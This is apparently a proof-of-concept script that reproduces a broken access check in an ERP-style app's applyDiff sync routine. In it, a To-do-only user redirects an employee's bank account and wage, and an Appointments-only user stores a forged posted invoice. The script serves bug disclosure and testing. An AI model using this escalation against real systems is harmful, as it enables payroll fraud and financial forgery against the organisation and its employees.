// Repro: app allow-list (modelsForApps) grants write access far beyond the app's menus. Runs the same applyDiff call as POST /api/diff.
const root = process.argv[2];
const { modelsForApps } = await import(root + '/src/models/index.js');
const { applyDiff } = await import(root + '/src/sync.js');
const { seed } = await import(root + '/src/seed.js');
const db = seed();
const emp = db.records['hr.employee'][0];
console.log('employee', emp.id, emp.name, 'bank_account before:', JSON.stringify(emp.bank_account), 'wage:', emp.wage);
// User restricted to the To-do app only.
const todo = modelsForApps(['todo']);
console.log('todo-only allowed has hr.employee:', todo.has('hr.employee'), 'res.company:', todo.has('res.company'), 'account.account:', todo.has('account.account'));
const d1 = { upserts: { 'hr.employee': [{ ...emp, bank_account: 'XX00 ATTACKER 0001', wage: 999999 }] } };
const after1 = applyDiff(db, d1, { author: 'todo-user', isAdmin: false, allowed: todo });
const e2 = after1.records['hr.employee'].find((e) => e.id === emp.id);
console.log('after todo-only diff: bank_account =', e2.bank_account, 'wage =', e2.wage);
// User restricted to Appointments only: create a posted customer invoice.
const appt = modelsForApps(['appointments']);
console.log('appointments-only allowed has account.move:', appt.has('account.move'));
const sample = db.records['account.move'].find((m) => m.state === 'posted' && m.move_type === 'out_invoice');
const newId = Math.max(...db.records['account.move'].map((m) => m.id)) + 1;
const forged = { ...sample, id: newId, name: 'INV/FORGED/0001', amount_total: undefined };
const after2 = applyDiff(db, { upserts: { 'account.move': [forged] } }, { author: 'appt-user', isAdmin: false, allowed: appt });
const f = after2.records['account.move'].find((m) => m.id === newId);
console.log('forged move stored:', !!f, f && f.state, f && f.name, 'lines:', f && (f.line_ids ?? []).length);
